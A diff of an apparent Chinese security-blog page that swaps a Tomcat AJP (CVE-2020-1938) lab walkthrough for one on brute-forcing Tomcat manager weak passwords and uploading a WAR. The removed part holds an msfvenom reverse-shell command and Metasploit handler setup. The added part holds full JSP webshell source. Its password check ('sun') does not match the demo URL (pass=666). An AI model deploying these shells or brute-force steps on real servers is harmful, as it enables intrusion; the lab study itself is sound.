@@ -16,33 +16,43 @@
   <meta name="author" content="小太阳">
   <meta name="keywords" content="">
   
-    <meta name="description" content="漏洞原理Tomcat在默认的conf&#x2F;server.xml中配置了2个Connector，一个默认监听8080端口处理HTTP请求，另外一个默认监听8009端口处理AJP请求，方便与其他Web服务器通过AJP协议进行交互。由于Tomcat AJP协议存在缺陷，致使攻击者可以控制三个参数javax.servlet.include.request_uri、javax.servlet.incl">
+    <meta name="description" content="漏洞原理tomcat存在管理后台进行应用部署管理，且管理后台使用HTTP基础认证进行登录。若用户口令为弱口令，攻击者容易进行暴力破解登录后台并进行应用管理。登录成功后有上传点，上传压缩包 xxx.war的.war不会被解析，直接访问 xxx&#x2F;目录下的木马，拿到权限。 利用条件1、tomcat所有版本 准备阶段攻击机：192.168.129.128_window10 靶机 ：192.168">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Aapache Tomcat AJP 任意文件读取包含漏洞（CVE-2020-1938）">
-<meta property="og:url" content="https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/index.html">
+<meta property="og:title" content="Tomcat7+弱密码&amp;&amp;后端Getshell漏洞">
+<meta property="og:url" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="小太阳&amp;博客">
-<meta property="og:description" content="漏洞原理Tomcat在默认的conf&#x2F;server.xml中配置了2个Connector，一个默认监听8080端口处理HTTP请求，另外一个默认监听8009端口处理AJP请求，方便与其他Web服务器通过AJP协议进行交互。由于Tomcat AJP协议存在缺陷，致使攻击者可以控制三个参数javax.servlet.include.request_uri、javax.servlet.incl">
+<meta property="og:description" content="漏洞原理tomcat存在管理后台进行应用部署管理，且管理后台使用HTTP基础认证进行登录。若用户口令为弱口令，攻击者容易进行暴力破解登录后台并进行应用管理。登录成功后有上传点，上传压缩包 xxx.war的.war不会被解析，直接访问 xxx&#x2F;目录下的木马，拿到权限。 利用条件1、tomcat所有版本 准备阶段攻击机：192.168.129.128_window10 靶机 ：192.168">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220814221907783.png">
-<meta property="og:image" content="https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220814222719820.png">
-<meta property="og:image" content="https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220814230646159.png">
-<meta property="og:image" content="https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220815004053854.png">
-<meta property="og:image" content="https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220815010558155.png">
-<meta property="og:image" content="https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220815011914192.png">
-<meta property="og:image" content="https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220815010815911.png">
-<meta property="og:image" content="https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220815005523753.png">
-<meta property="article:published_time" content="2022-08-14T08:29:16.000Z">
-<meta property="article:modified_time" content="2022-08-18T03:16:58.078Z">
+<meta property="og:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818154809280.png">
+<meta property="og:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818130507238.png">
+<meta property="og:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818130634750.png">
+<meta property="og:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818130922937.png">
+<meta property="og:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818131137054.png">
+<meta property="og:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818131508992.png">
+<meta property="og:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133313901.png">
+<meta property="og:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133327878.png">
+<meta property="og:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133338417.png">
+<meta property="og:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133357998.png">
+<meta property="og:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818135945044.png">
+<meta property="og:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818134605079.png">
+<meta property="og:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818154626194.png">
+<meta property="og:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818141322866.png">
+<meta property="og:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818141402755.png">
+<meta property="og:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818151948255.png">
+<meta property="og:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818152031725.png">
+<meta property="og:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818152255496.png">
+<meta property="article:published_time" content="2022-08-18T03:22:23.000Z">
+<meta property="article:modified_time" content="2022-08-18T07:54:42.219Z">
 <meta property="article:author" content="小太阳">
 <meta property="article:tag" content="vulhub">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220814221907783.png">
+<meta name="twitter:image" content="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818154809280.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Aapache Tomcat AJP 任意文件读取包含漏洞（CVE-2020-1938） - 小太阳&amp;博客</title>
+  <title>Tomcat7+弱密码&amp;&amp;后端Getshell漏洞 - 小太阳&amp;博客</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -208,7 +218,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Aapache Tomcat AJP 任意文件读取包含漏洞（CVE-2020-1938）"></span>
+            <span id="subtitle" data-typed-text="Tomcat7+弱密码&amp;&amp;后端Getshell漏洞"></span>
           
         </div>
 
@@ -219,8 +229,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-08-14 16:29" pubdate>
-          2022年8月14日 下午
+        <time datetime="2022-08-18 11:22" pubdate>
+          2022年8月18日 上午
         </time>
       </span>
     
@@ -231,7 +241,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.5k 字
+          1k 字
         
       </span>
     
@@ -242,7 +252,7 @@
         
         
         
-          13 分钟
+          9 分钟
         
       </span>
     
@@ -280,52 +290,59 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Aapache Tomcat AJP 任意文件读取包含漏洞（CVE-2020-1938）</h1>
+            <h1 style="display: none">Tomcat7+弱密码&amp;&amp;后端Getshell漏洞</h1>
             
             
               <div class="markdown-body">
                 
-                <h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Tomcat在默认的conf&#x2F;server.xml中配置了2个Connector，一个默认监听8080端口处理HTTP请求，另外一个默认监听8009端口处理AJP请求，方便与其他Web服务器通过AJP协议进行交互。由于Tomcat AJP协议存在缺陷，致使攻击者可以控制三个参数javax.servlet.include.request_uri、javax.servlet.include.path_info、javax.servlet.include.servlet_path，通过构造特定参数读取webapp目录下的任意文件或包含文件，如：webapp 配置文件或源代码等。</p>
-<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.版本为Apache Tomcat 9.x &lt; 9.0.31、8.x &lt; 8.5.51、7.x &lt; 7.0.100、6.x</p>
-<p>2.AJP服务的端口开放（默认8009）</p>
-<h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10、192.168.129.130_kali</p>
-<p>靶机 ：192.168.129.131_centos</p>
-<p>poc：<a target="_blank" rel="noopener" href="https://github.com/sv3nbeast/CVE-2020-1938-Tomact-file_include-file_read">https://github.com/sv3nbeast/CVE-2020-1938-Tomact-file_include-file_read</a></p>
+                <h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>tomcat存在管理后台进行应用部署管理，且管理后台使用HTTP基础认证进行登录。若用户口令为弱口令，攻击者容易进行暴力破解登录后台并进行应用管理。登录成功后有上传点，上传压缩包 xxx.war的.war不会被解析，直接访问 xxx&#x2F;目录下的木马，拿到权限。</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1、tomcat所有版本</p>
+<h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10</p>
+<p>靶机 ：192.168.129.130_kali</p>
 <h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose build #进行编译<br><br>docker-compose up -d #运行靶场<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose build #进行编译<br><br>docker-compose up -d #运行靶场<br><br>docker ps  #查看容器<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220814221907783.png" srcset="/img/loading.gif" lazyload alt="image-20220814221907783"></p>
-<h5 id="2-漏洞验证"><a href="#2-漏洞验证" class="headerlink" title="2.漏洞验证"></a>2.漏洞验证</h5><p>查看靶机开放端口</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -Pn -sV -T4 -O 192.168.129.131<br></code></pre></td></tr></table></figure>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818154809280.png" srcset="/img/loading.gif" lazyload alt="image-20220818154809280"></p>
+<h5 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h5><p>访问<a target="_blank" rel="noopener" href="http://192.168.129.130:8080/">http://192.168.129.130:8080/</a></p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818130507238.png" srcset="/img/loading.gif" lazyload alt="image-20220818130507238"></p>
+<p>进行登录</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818130634750.png" srcset="/img/loading.gif" lazyload alt="image-20220818130634750"></p>
+<p>BurpSuitPro抓包</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818130922937.png" srcset="/img/loading.gif" lazyload alt="image-20220818130922937"></p>
+<p>发现账号密码格式为 base64(账号:密码)</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818131137054.png" srcset="/img/loading.gif" lazyload alt="image-20220818131137054"></p>
+<p>发到测试器进行爆破</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818131508992.png" srcset="/img/loading.gif" lazyload alt="image-20220818131508992"></p>
+<p>选择自定义迭代器并导入用户名字典</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133313901.png" srcset="/img/loading.gif" lazyload alt="image-20220818133313901"></p>
+<p>导入：</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133327878.png" srcset="/img/loading.gif" lazyload alt="image-20220818133327878"></p>
+<p>导入密码字典</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133338417.png" srcset="/img/loading.gif" lazyload alt="image-20220818133338417"></p>
+<p>进行base64编码</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133357998.png" srcset="/img/loading.gif" lazyload alt="image-20220818133357998"></p>
+<p>url编码这些字符不选</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818135945044.png" srcset="/img/loading.gif" lazyload alt="image-20220818135945044"></p>
+<p>设置线程，防止被封</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818134605079.png" srcset="/img/loading.gif" lazyload alt="image-20220818134605079"></p>
+<p>开始测试</p>
+<p>获得弱口令为tomcat:tomcat</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818154626194.png" srcset="/img/loading.gif" lazyload alt="image-20220818154626194"></p>
+<p>登录后台</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818141322866.png" srcset="/img/loading.gif" lazyload alt="image-20220818141322866"></p>
+<p>找到上传点</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818141402755.png" srcset="/img/loading.gif" lazyload alt="image-20220818141402755"></p>
+<p>将jsp木马压缩成zip文件，然后将后缀改为war</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818151948255.png" srcset="/img/loading.gif" lazyload alt="image-20220818151948255"></p>
+<p>小马代码如下</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;sun&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pass&quot;</span>)))&#123;<br>java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br><span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br><span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;<br>out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b));<br>&#125;<br>out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220814222719820.png" srcset="/img/loading.gif" lazyload alt="image-20220814222719820"></p>
-<p>ajp13端口开放，tomcat版本9.0.30，满足漏洞利用条件</p>
-<h5 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h5><p>使用exp中的文件读取脚本，尝试读取web.xml（使用python2环境）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python2 Tomcat-ROOT 路径下文件读取(CVE-2020-1938).py -f WEB-INF/web.xml 192.168.129.131<br></code></pre></td></tr></table></figure>
-
-<p><img src="/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220814230646159.png" srcset="/img/loading.gif" lazyload alt="image-20220814230646159"></p>
-<p>读取成功</p>
-<p>进入kali，生成jsp木马</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.129.130 LPORT=6666 -f raw &gt; shell.jsp <br></code></pre></td></tr></table></figure>
-
-<p><img src="/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220815004053854.png" srcset="/img/loading.gif" lazyload alt="image-20220815004053854"></p>
-<p>设置监听 </p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfconsole <br><br>use exploit/multi/handler  #使用监听模块<br><br>set payload java/jsp_shell_reverse_tcp  #设置反向监听<br><br>set lhost 192.168.129.130  #设置监听ip<br><br>set lport 6666  #设置监听端口<br><br>options  #查看设置是否正确<br><br>run #开启监听<br></code></pre></td></tr></table></figure>
-
-<p><img src="/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220815010558155.png" srcset="/img/loading.gif" lazyload alt="image-20220815010558155"></p>
-<p>进入靶机，上传木马</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker ps #查看容器ID <br><br>docker exec -it 容器id bash #进入docker容器<br><br>cd /usr/local/tomcat/webapps/ROOT #进入ROOT目录<br></code></pre></td></tr></table></figure>
-
-<p>假设我们通过文件上传漏洞上传了jsp脚本的txt文件，来尝试文件包含进行远程代码执行（RCE）（创建一个含jsp脚本的txt文件）</p>
-<p>把刚才从kali中生成的shell.jsp重命名为shell.txt,并想办法上传到靶机中（模拟文件上传漏洞）</p>
-<p><img src="/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220815011914192.png" srcset="/img/loading.gif" lazyload alt="image-20220815011914192"></p>
-<p>使用exp中的文件包含脚本</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python2 CVE-2020-1938\Tomcat-ROOT路径下文件包含(CVE-2020-1938).py -f /shell.txt 192.168.129.131<br></code></pre></td></tr></table></figure>
-
-<p><img src="/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220815010815911.png" srcset="/img/loading.gif" lazyload alt="image-20220815010815911"></p>
-<p>kali成功上线</p>
-<p><img src="/2022/08/14/CVE-2020-1938%EF%BC%88Aapache%20Tomcat%20AJP%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220815005523753.png" srcset="/img/loading.gif" lazyload alt="image-20220815005523753"></p>
-<h5 id="4-关闭环境"><a href="#4-关闭环境" class="headerlink" title="4.关闭环境"></a>4.关闭环境</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose down --rmi all -v #关闭并删除环境<br></code></pre></td></tr></table></figure>
+<p>进行上传</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818152031725.png" srcset="/img/loading.gif" lazyload alt="image-20220818152031725"></p>
+<p>成功上传，访问<a target="_blank" rel="noopener" href="http://192.168.129.130:8080/shell/shell.jsp?pass=666&amp;cmd=pwd">http://192.168.129.130:8080/shell/shell.jsp?pass=666&amp;cmd=pwd</a></p>
+<p>（pass参数为密码，cmd参数为命令)</p>
+<p><img src="/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818152255496.png" srcset="/img/loading.gif" lazyload alt="image-20220818152255496"></p>
+<h5 id="关闭环境"><a href="#关闭环境" class="headerlink" title="关闭环境"></a>关闭环境</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose down --rmi all -v #关闭并删除环境<br></code></pre></td></tr></table></figure>
 
 
                 
@@ -372,8 +389,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Aapache Tomcat AJP 任意文件读取包含漏洞（CVE-2020-1938）</div>
-      <div>https://xiaojun88.github.io/2022/08/14/CVE-2020-1938（Aapache Tomcat AJP 任意文件读取包含漏洞）/</div>
+      <div>Tomcat7+弱密码&amp;&amp;后端Getshell漏洞</div>
+      <div>https://xiaojun88.github.io/2022/08/18/Tomcat7+弱密码&amp;&amp;后端Getshell漏洞/</div>
     </div>
     <div class="license-meta">
       
@@ -385,7 +402,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年8月14日</div>
+          <div>2022年8月18日</div>
         </div>
       
       
@@ -415,18 +432,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/08/15/CVE-2021-29441(Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87)/" title="Nacos 身份验证绕过(CVE-2021-29441Nacos)">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Nacos 身份验证绕过(CVE-2021-29441Nacos)</span>
